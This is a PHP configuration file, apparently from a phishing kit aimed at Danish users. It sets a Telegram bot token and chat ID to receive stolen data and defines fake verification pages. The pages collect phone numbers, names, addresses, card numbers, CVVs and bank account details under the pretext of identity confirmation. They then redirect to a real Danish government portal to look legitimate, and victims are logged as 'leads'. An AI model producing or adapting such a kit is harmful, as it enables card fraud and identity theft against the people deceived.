<?php
// ============================================
// TELEGRAM BOT CONFIGURATION
// ============================================
$bot_token = "YOUR_BOT_TOKEN_HERE";  // Get from @BotFather
$chat_id = "YOUR_CHAT_ID_HERE";      // Your Telegram chat ID

// ============================================
// CUSTOMIZABLE SECTIONS (EDIT THESE)
// ============================================

// Page 2 - What you want the client to insert
$page2_title = "Bekræft dit telefonnummer";
$page2_description = "Indtast dit telefonnummer for at modtage en bekræftelseskode";
$page2_field_label = "Telefonnummer";
$page2_field_placeholder = "f.eks. 45XXXXXXXX";
$page2_field_name = "phone_number";

// Page 3 - What information your client has
$page3_title = "Personlige oplysninger";
$page3_description = "Indtast dine personlige oplysninger for at bekræfte din identitet";
$page3_fields = [
    [
        'label' => 'Fulde navn',
        'placeholder' => 'Indtast dit fulde navn',
        'name' => 'full_name',
        'type' => 'text'
    ],
    [
        'label' => 'Adresse',
        'placeholder' => 'Indtast din adresse',
        'name' => 'address',
        'type' => 'text'
    ],
    [
        'label' => 'Postnummer',
        'placeholder' => 'f.eks. 4100',
        'name' => 'postal_code',
        'type' => 'text'
    ],
    [
        'label' => 'By',
        'placeholder' => 'Indtast din by',
        'name' => 'city',
        'type' => 'text'
    ]
];

// Page 4 - Card information
$page4_title = "Betalingsoplysninger";
$page4_description = "Indtast dine kortoplysninger for at bekræfte din identitet";
$page4_bank_label = "Bank";
$page4_cardholder_label = "Kortholder navn";
$page4_cardnumber_label = "Kortnummer";
$page4_expiry_label = "Udløbsdato";
$page4_cvv_label = "CVV";
$page4_reg_label = "Registreringsnummer";
$page4_account_label = "Kontonummer";

// Page 5 - Thank you
$page5_title = "Tak for din henvendelse!";
$page5_message = "Tak for upload. Vores kundeservice vil kontakte dig inden for kort tid.";

// Redirect after completion (optional)
$redirect_url = "https://virk.dk/";

// Lead counter file
$lead_counter_file = "data/lead_counter.txt";

// Enable file logging
$enable_file_log = true;
$log_file = "data/leads.json";
?>
